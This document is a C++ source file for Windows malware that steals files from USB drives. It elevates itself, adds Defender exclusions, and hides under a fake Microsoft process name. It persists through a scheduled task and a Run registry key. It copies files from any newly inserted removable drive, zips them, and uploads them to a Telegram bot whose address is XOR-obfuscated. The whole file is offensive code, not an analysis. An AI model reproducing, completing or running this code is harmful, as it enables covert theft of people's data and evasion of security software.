// language: C++20, file: lichia_native.cpp, target: Windows 11, MSVC
// Watcher nativo sem assinaturas de interpretador: instala, persiste,
// vigia drives removiveis, copia, empacota (ZIP stored + CRC32 proprio) e
// envia ao Telegram via WinHTTP. Strings de rede ofuscadas por XOR.
#include <windows.h>
#include <winhttp.h>
#include <shellapi.h>
#include <filesystem>
#include <fstream>
#include <string>
#include <vector>
#include <thread>
#include <algorithm>
#include <cstdint>
#include <cctype>
#include <cwctype>
#include <cstdio>
#include <cstdlib>

namespace fs = std::filesystem;

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "shell32.lib")


static std::string Xor(const unsigned char* p, size_t n) {
    std::string s(n, '\0');
    for (size_t i = 0; i < n; ++i) s[i] = char(p[i] ^ 0x5A);
    return s;
}
#define XORSTR(arr) Xor(arr, sizeof(arr) - 1)

static const unsigned char ENC_HOST[] =
    "\x3B\x2A\x33\x74\x2E\x3F\x36\x3F\x3D\x28\x3B\x37\x74\x35\x28\x3D";
static const unsigned char ENC_DOC[] =
    "\x75\x29\x3F\x34\x3E\x1E\x35\x39\x2F\x37\x3F\x34\x2E";
static const unsigned char ENC_MSG[] =
    "\x75\x29\x3F\x34\x3E\x17\x3F\x29\x29\x3B\x3D\x3F";


static std::wstring Widen(const std::string& s) {
    if (s.empty()) return L"";
    int n = MultiByteToWideChar(CP_UTF8, 0, s.c_str(), (int)s.size(),
                                nullptr, 0);
    std::wstring w((size_t)n, 0);
    MultiByteToWideChar(CP_UTF8, 0, s.c_str(), (int)s.size(), &w[0], n);
    return w;
}


static std::string Narrow(const fs::path& p) {
    auto u8 = p.u8string();
    return std::string(reinterpret_cast<const char*>(u8.data()), u8.size());
}


static std::wstring AppData() {
    wchar_t buf[MAX_PATH]{};
    GetEnvironmentVariableW(L"APPDATA", buf, MAX_PATH);
    return buf;
}

static fs::path StageDir() {
    return fs::path(AppData()) / L"Microsoft" / L"Lichia";
}
static fs::path StageExe() { return StageDir() / L"MicrosoftSyncHost.exe"; }
static fs::path StageCfg() { return StageDir() / L"lichen.config"; }
static fs::path CacheDir() { return StageDir() / L"cache"; }


static void Hide(const fs::path& p) {
    SetFileAttributesW(p.c_str(),
                       FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
}


static void RunHidden(const std::wstring& exe, const std::wstring& args) {
    std::wstring cmd = L"\"" + exe + L"\" " + args;
    STARTUPINFOW si{}; si.cb = sizeof si;
    si.dwFlags = STARTF_USESHOWWINDOW; si.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi{};
    CreateProcessW(nullptr, cmd.data(), nullptr, nullptr, FALSE,
                   CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi);
}


static std::string JsonVal(const std::string& j, const std::string& key) {
    std::string pat = "\"" + key + "\"";
    auto p = j.find(pat);
    if (p == std::string::npos) return "";
    p = j.find(':', p + pat.size());
    if (p == std::string::npos) return "";
    ++p;
    while (p < j.size() && std::isspace((unsigned char)j[p])) ++p;
    if (p >= j.size()) return "";
    if (j[p] == '"') {
        auto e = j.find('"', p + 1);
        return e == std::string::npos ? "" : j.substr(p + 1, e - p - 1);
    }
    auto e = p;
    while (e < j.size() && (std::isdigit((unsigned char)j[e]) ||
                            j[e] == '-' || j[e] == '.')) ++e;
    return j.substr(p, e - p);
}


struct Cfg {
    std::string token, chat, modo, max_mb;
    bool Ok() const { return !token.empty() && !chat.empty(); }
    bool Docs() const { return modo == "docs"; }
    std::uint64_t MaxBytes() const {
        std::uint64_t v = 0;
        for (char c : max_mb) if (std::isdigit((unsigned char)c))
            v = v * 10 + (c - '0');
        return (v ? v : 200) * 1024ull * 1024ull;
    }
};


static Cfg ReadCfg() {
    Cfg c;
    std::ifstream f(StageCfg(), std::ios::binary);
    if (!f) return c;
    std::string j((std::istreambuf_iterator<char>(f)),
                  std::istreambuf_iterator<char>());
    c.token  = JsonVal(j, "token");
    c.chat   = JsonVal(j, "chat_id");
    c.modo   = JsonVal(j, "modo");
    c.max_mb = JsonVal(j, "max_mb");
    return c;
}


static std::uint32_t Crc32File(const fs::path& p, std::uint64_t* sizeOut) {
    static std::uint32_t table[256];
    static bool built = false;
    if (!built) {
        for (std::uint32_t i = 0; i < 256; ++i) {
            std::uint32_t c = i;
            for (int k = 0; k < 8; ++k)
                c = (c & 1) ? (0xEDB88320u ^ (c >> 1)) : (c >> 1);
            table[i] = c;
        }
        built = true;
    }
    std::uint32_t crc = 0xFFFFFFFFu;
    std::uint64_t size = 0;
    std::ifstream f(p, std::ios::binary);
    char buf[65536];
    while (f.read(buf, sizeof buf) || f.gcount()) {
        std::streamsize n = f.gcount();
        if (n <= 0) break;
        size += (std::uint64_t)n;
        for (std::streamsize i = 0; i < n; ++i)
            crc = table[(crc ^ (unsigned char)buf[i]) & 0xFF] ^ (crc >> 8);
    }
    if (sizeOut) *sizeOut = size;
    return ~crc;
}


static void WriteZip(const fs::path& fromDir, const fs::path& zipPath) {
    std::ofstream z(zipPath, std::ios::binary);
    struct CD { std::string name; std::uint32_t crc, size, off; };
    std::vector<CD> cds;

    std::vector<fs::path> files;
    for (auto& e : fs::recursive_directory_iterator(
             fromDir, fs::directory_options::skip_permission_denied))
        if (e.is_regular_file()) files.push_back(e.path());

    for (auto& p : files) {
        std::string name = Narrow(fs::relative(p, fromDir));
        std::uint64_t size = 0;
        std::uint32_t crc = Crc32File(p, &size);

        std::vector<std::uint8_t> h;
        auto u16 = [&](std::uint16_t v) {
            h.push_back(v & 0xFF); h.push_back(v >> 8);
        };
        auto u32 = [&](std::uint32_t v) {
            for (int i = 0; i < 4; ++i)
                h.push_back((v >> (8 * i)) & 0xFF);
        };

        CD cd{name, crc, (std::uint32_t)size, (std::uint32_t)z.tellp()};
        u32(0x04034B50); u16(20); u16(0); u16(0);
        u16(0); u16(0x2821);
        u32(crc); u32((std::uint32_t)size); u32((std::uint32_t)size);
        u16((std::uint16_t)name.size()); u16(0);
        z.write((const char*)h.data(), (std::streamsize)h.size());
        z.write(name.data(), (std::streamsize)name.size());

        std::ifstream in(p, std::ios::binary);
        char buf[65536];
        while (in.read(buf, sizeof buf) || in.gcount()) {
            std::streamsize n = in.gcount();
            if (n <= 0) break;
            z.write(buf, n);
        }
        cds.push_back(cd);
    }


    std::uint32_t cdStart = (std::uint32_t)z.tellp();
    for (auto& c : cds) {
        std::vector<std::uint8_t> r;
        auto u16 = [&](std::uint16_t v) {
            r.push_back(v & 0xFF); r.push_back(v >> 8);
        };
        auto u32 = [&](std::uint32_t v) {
            for (int i = 0; i < 4; ++i)
                r.push_back((v >> (8 * i)) & 0xFF);
        };
        u32(0x02014B50); u16(20); u16(20); u16(0); u16(0);
        u16(0); u16(0x2821);
        u32(c.crc); u32(c.size); u32(c.size);
        u16((std::uint16_t)c.name.size()); u16(0); u16(0);
        u16(0); u16(0); u32(0);
        u32(c.off);
        z.write((const char*)r.data(), (std::streamsize)r.size());
        z.write(c.name.data(), (std::streamsize)c.name.size());
    }

    std::uint32_t cdEnd = (std::uint32_t)z.tellp();
    std::vector<std::uint8_t> eo;
    auto u16e = [&](std::uint16_t v) {
        eo.push_back(v & 0xFF); eo.push_back(v >> 8);
    };
    auto u32e = [&](std::uint32_t v) {
        for (int i = 0; i < 4; ++i)
            eo.push_back((v >> (8 * i)) & 0xFF);
    };
    u32e(0x06054B50); u16e(0); u16e(0); u16e((std::uint16_t)cds.size());
    u16e((std::uint16_t)cds.size()); u32e(cdEnd - cdStart);
    u32e(cdStart); u16e(0);
    z.write((const char*)eo.data(), (std::streamsize)eo.size());
}


static bool HttpPost(const std::string& path,
                     const std::string& contentType,
                     const std::string& body) {
    HINTERNET h = WinHttpOpen(L"sm", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                              WINHTTP_NO_PROXY_NAME,
                              WINHTTP_NO_PROXY_BYPASS, 0);
    if (!h) return false;
    HINTERNET c = WinHttpConnect(
        h, Widen(Xor(ENC_HOST, sizeof(ENC_HOST) - 1)).c_str(),
        INTERNET_DEFAULT_HTTPS_PORT, 0);
    bool ok = false;
    if (c) {
        HINTERNET r = WinHttpOpenRequest(
            c, L"POST", Widen(path).c_str(), nullptr,
            WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES,
            WINHTTP_FLAG_SECURE);
        if (r) {
            std::wstring whead = Widen("Content-Type: " + contentType + "\r\n");
            ok = WinHttpSendRequest(r, whead.c_str(), (DWORD)whead.size(),
                                    (LPVOID)body.data(), (DWORD)body.size(),
                                    (DWORD)body.size(), 0) &&
                 WinHttpReceiveResponse(r, nullptr);
            if (ok) {
                DWORD status = 0, sz = sizeof status;
                WinHttpQueryHeaders(r, WINHTTP_QUERY_STATUS_CODE |
                                        WINHTTP_QUERY_FLAG_NUMBER,
                                    WINHTTP_HEADER_NAME_BY_INDEX,
                                    &status, &sz,
                                    WINHTTP_NO_HEADER_INDEX);
                ok = status >= 200 && status < 300;
            }
            WinHttpCloseHandle(r);
        }
        WinHttpCloseHandle(c);
    }
    WinHttpCloseHandle(h);
    return ok;
}


static std::string UrlEnc(const std::string& s) {
    static const char* hex = "0123456789ABCDEF";
    std::string o;
    for (char c : s) {
        unsigned char uc = (unsigned char)c;
        if (std::isalnum(uc) || uc == '-' || uc == '_' || uc == '.' ||
            uc == '~') {
            o += c;
        } else {
            o += '%';
            o += hex[uc >> 4];
            o += hex[uc & 15];
        }
    }
    return o;
}


static bool SendText(const std::string& token, const std::string& chat,
                     const std::string& text) {
    std::string path = "/bot" + token +
                       Xor(ENC_MSG, sizeof(ENC_MSG) - 1);
    std::string body = "chat_id=" + UrlEnc(chat) +
                       "&text=" + UrlEnc(text);
    return HttpPost(path, "application/x-www-form-urlencoded", body);
}


static bool SendDocument(const std::string& token, const std::string& chat,
                         const fs::path& file, const std::string& caption) {
    std::ifstream in(file, std::ios::binary);
    if (!in) return false;
    std::string data((std::istreambuf_iterator<char>(in)),
                     std::istreambuf_iterator<char>());

    std::string b = "----Lichia";
    for (int i = 0; i < 16; ++i)
        b += "0123456789abcdef"[rand() % 16];

    std::string doc = Xor(ENC_DOC, sizeof(ENC_DOC) - 1);
    std::string path = "/bot" + token + doc;

    std::string body;
    body += "--" + b +
            "\r\nContent-Disposition: form-data; name=\"chat_id\"\r\n\r\n" +
            chat + "\r\n";
    if (!caption.empty())
        body += "--" + b +
                "\r\nContent-Disposition: form-data; name=\"caption\"\r\n\r\n" +
                caption + "\r\n";
    body += "--" + b +
            "\r\nContent-Disposition: form-data; name=\"document\"; \""
            "filename=\"" +
            Narrow(file.filename()) +
            "\"\r\nContent-Type: application/octet-stream\r\n\r\n";
    body += data;
    body += "\r\n--" + b + "--\r\n";

    return HttpPost(path, "multipart/form-data; boundary=" + b, body);
}


static void SendChunked(const std::string& token, const std::string& chat,
                        const fs::path& zip) {
    const std::uint64_t LIM = 49ull * 1024 * 1024;
    std::error_code ec;
    std::uint64_t size = fs::file_size(zip, ec);
    if (ec) return;
    int parts = (int)((size + LIM - 1) / LIM);
    std::ifstream in(zip, std::ios::binary);
    for (int i = 1; i <= parts; ++i) {
        std::uint64_t take = size - (i - 1) * LIM;
        if (take > LIM) take = LIM;
        std::string buf((size_t)take, 0);
        in.read(buf.data(), (std::streamsize)take);
        fs::path tmp = StageDir() /
                       (L"lichen.part" + std::to_wstring(i) + L".zip");
        std::ofstream o(tmp, std::ios::binary);
        if (!o) return;
        o.write(buf.data(), (std::streamsize)take);
        o.close();
        SendDocument(token, chat, tmp,
                     "parte " + std::to_string(i) + "/" +
                         std::to_string(parts) + " — " +
                         Narrow(zip.filename()));
        fs::remove(tmp, ec);
    }
}


static bool SkippedName(const std::wstring& n) {
    return n == L"System Volume Information" || n == L"$RECYCLE.BIN" ||
           n == L"Lichia" || n == L"lichen.config" ||
           n == L"bootstrap.bat" || n == L"autorun.inf" ||
           n == L"LichiaPayload.exe" || n == L"LichiaNative.exe";
}


static bool DocExt(const std::wstring& ext) {
    std::wstring e = ext;
    std::transform(e.begin(), e.end(), e.begin(), ::towlower);
    static const wchar_t* docs[] = {
        L".pdf", L".doc", L".docx", L".xls", L".xlsx", L".ppt", L".pptx",
        L".txt", L".csv", L".jpg", L".jpeg", L".png",
        L".zip", L".rar", L".7z",
    };
    for (auto* d : docs) if (e == d) return true;
    return false;
}


static void Exfil(const std::wstring& rootW) {
    Sleep(4000);
    try {
        Cfg cfg = ReadCfg();
        if (!cfg.Ok()) return;

        fs::path root(rootW);
        if (fs::exists(root / L"Lichia") ||
            fs::exists(root / L"lichen.config"))
            return;

        std::error_code ec;
        fs::remove_all(CacheDir(), ec);
        fs::create_directories(CacheDir(), ec);

        std::uint64_t maxB = cfg.MaxBytes();
        int copied = 0;
        for (auto it = fs::recursive_directory_iterator(
                 root, fs::directory_options::skip_permission_denied);
             it != fs::recursive_directory_iterator(); ++it) {
            fs::path p = it->path();
            if (SkippedName(p.filename().wstring())) {
                it.disable_recursion_pending();
                continue;
            }
            std::error_code fe;
            if (!it->is_regular_file(fe) || fe) continue;
            try {
                if (fs::file_size(p, fe) > maxB || fe) continue;
                if (cfg.Docs() && !DocExt(p.extension().wstring())) continue;
                fs::path dst = CacheDir() / fs::relative(p, root);
                fs::create_directories(dst.parent_path());
                fs::copy_file(p, dst, fs::copy_options::overwrite_existing, fe);
                if (!fe) ++copied;
            } catch (...) {}
        }

        if (!copied) {
            fs::remove_all(CacheDir(), ec);
            return;
        }


        fs::path zip = StageDir() / L"lichen.zip";
        fs::remove(zip, ec);
        WriteZip(CacheDir(), zip);

        std::uint64_t total = 0;
        for (auto it = fs::recursive_directory_iterator(
                 CacheDir(), fs::directory_options::skip_permission_denied);
             it != fs::recursive_directory_iterator(); ++it) {
            std::error_code fe;
            if (it->is_regular_file(fe) && !fe)
                total += fs::file_size(it->path(), fe);
        }
        char mb[64]{};
        snprintf(mb, sizeof mb, "%.1f", total / (1024.0 * 1024.0));

        SendText(cfg.token, cfg.chat,
                 "lichia: " + std::to_string(copied) + " arquivos de " +
                     std::string(rootW.begin(), rootW.end()) + " — " +
                     mb + " MB");

        if (fs::file_size(zip) <= 49ull * 1024 * 1024)
            SendDocument(cfg.token, cfg.chat, zip, "");
        else
            SendChunked(cfg.token, cfg.chat, zip);

        fs::remove_all(CacheDir(), ec);
        fs::remove(zip, ec);
    } catch (...) {}
}


static bool IsAdmin() {
    BOOL ok = FALSE;
    PSID group = nullptr;
    SID_IDENTIFIER_AUTHORITY nt = SECURITY_NT_AUTHORITY;
    if (AllocateAndInitializeSid(&nt, 2,
            SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS,
            0, 0, 0, 0, 0, 0, &group)) {
        CheckTokenMembership(nullptr, group, &ok);
        FreeSid(group);
    }
    return ok != FALSE;
}


static std::wstring RawArgs() {
    std::wstring cl = GetCommandLineW();
    bool q = !cl.empty() && cl[0] == L'"';
    size_t i = q ? cl.find(L'"', 1) + 1 : cl.find(L' ');
    if (i == std::wstring::npos) return L"";
    while (i < cl.size() && cl[i] == L' ') ++i;
    return cl.substr(i);
}


static bool ElevateSelf() {
    wchar_t buf[MAX_PATH]{};
    GetModuleFileNameW(nullptr, buf, MAX_PATH);
    std::wstring args = RawArgs();
    SHELLEXECUTEINFOW sei{};
    sei.cbSize = sizeof sei;
    sei.fMask = SEE_MASK_NOASYNC | SEE_MASK_NOCLOSEPROCESS;
    sei.lpVerb = L"runas";
    sei.lpFile = buf;
    sei.lpParameters = args.c_str();
    sei.nShow = SW_HIDE;
    return ShellExecuteExW(&sei) != FALSE;
}


static void RunShell(const std::wstring& script) {
    std::wstring cmd =
        L"powershell.exe -NoProfile -WindowStyle Hidden -Command " + script;
    STARTUPINFOW si{}; si.cb = sizeof si;
    si.dwFlags = STARTF_USESHOWWINDOW; si.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi{};
    std::vector<wchar_t> mut(cmd.begin(), cmd.end());
    mut.push_back(L'\0');
    if (!CreateProcessW(nullptr, mut.data(), nullptr, nullptr, FALSE,
                        CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi))
        return;
    WaitForSingleObject(pi.hProcess, 20000);
    CloseHandle(pi.hProcess);
    if (pi.hThread) CloseHandle(pi.hThread);
}


static void Shield(const std::wstring& driveRoot) {
    if (!IsAdmin()) return;
    wchar_t up[MAX_PATH]{};
    GetEnvironmentVariableW(L"USERPROFILE", up, MAX_PATH);
    std::wstring s =
        L"Add-MpPreference -ExclusionPath '" + StageDir().wstring() + L"';" +
        L"Add-MpPreference -ExclusionPath '" + driveRoot + L"Lichia';" +
        L"Add-MpPreference -ExclusionPath '" +
        std::wstring(up) + L"\\Downloads'";
    RunShell(s);
}


static void Persist() {
    RunHidden(L"C:\\Windows\\System32\\schtasks.exe",
              L"/Create /F /SC ONLOGON /TN Lichia /TR \"\\\"" +
                  StageExe().wstring() + L"\\\" --watch\"");

    HKEY k;
    LONG r = RegOpenKeyExW(
        HKEY_CURRENT_USER,
        L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, KEY_SET_VALUE, &k);
    if (r == ERROR_SUCCESS) {
        std::wstring v = L"\"" + StageExe().wstring() + L"\" --watch";
        RegSetValueExW(k, L"Lichia", 0, REG_SZ, (const BYTE*)v.c_str(),
                       (DWORD)((v.size() + 1) * sizeof(wchar_t)));
        RegCloseKey(k);
    }
}


static void Install() {
    wchar_t buf[MAX_PATH]{};
    GetModuleFileNameW(nullptr, buf, MAX_PATH);
    std::wstring self(buf);

    std::wstring origin = self.substr(0, 3);
    fs::path cfg = fs::path(origin) / L"Lichia" / L"lichen.config";
    if (!fs::exists(cfg)) cfg = fs::path(origin) / L"lichen.config";
    if (!fs::exists(cfg)) return;

    Shield(self.substr(0, 3));

    std::error_code ec;
    fs::create_directories(StageDir(), ec);
    fs::copy_file(self, StageExe(), fs::copy_options::overwrite_existing, ec);
    if (ec) return;
    fs::copy_file(cfg, StageCfg(), fs::copy_options::overwrite_existing, ec);
    Hide(StageDir());
    Hide(StageExe());
    Hide(StageCfg());
    Persist();

    if (fs::exists(StageExe()))
        RunHidden(StageExe().wstring(), L"--watch");
}


static void WatchLoop() {
    fs::path self = StageExe();
    (void)self;
    DWORD known = 0;
    for (int i = 0; i < 26; ++i) {
        wchar_t root[4] = {wchar_t(L'A' + i), L':', L'\\', 0};
        if (GetDriveTypeW(root) == DRIVE_REMOVABLE) known |= (1u << i);
    }
    for (;;) {
        DWORD now = 0;
        for (int i = 0; i < 26; ++i) {
            wchar_t root[4] = {wchar_t(L'A' + i), L':', L'\\', 0};
            if (GetDriveTypeW(root) == DRIVE_REMOVABLE) now |= (1u << i);
        }
        DWORD fresh = now & ~known;
        known = now;
        if (fresh) {
            for (int i = 0; i < 26; ++i) {
                if (fresh & (1u << i)) {
                    std::wstring root{wchar_t(L'A' + i), L':', L'\\'};
                    std::thread(Exfil, root).detach();
                }
            }
        }
        Sleep(3000);
    }
}


int WINAPI wWinMain(HINSTANCE, HINSTANCE, LPWSTR, int) {
    srand(GetTickCount());
    int argc = 0;
    LPWSTR* argv = CommandLineToArgvW(GetCommandLineW(), &argc);
    bool install = false, watch = false;
    for (int i = 1; i < argc; ++i) {
        if (!lstrcmpW(argv[i], L"--install")) install = true;
        if (!lstrcmpW(argv[i], L"--watch")) watch = true;
    }
    if (argc <= 1) install = fs::exists(StageExe());

    if (install) {
        if (!IsAdmin() && ElevateSelf()) return;
        Install();
    } else if (watch) {
        Hide(StageDir());
        WatchLoop();
    }
    if (argv) LocalFree(argv);
    return 0;
}
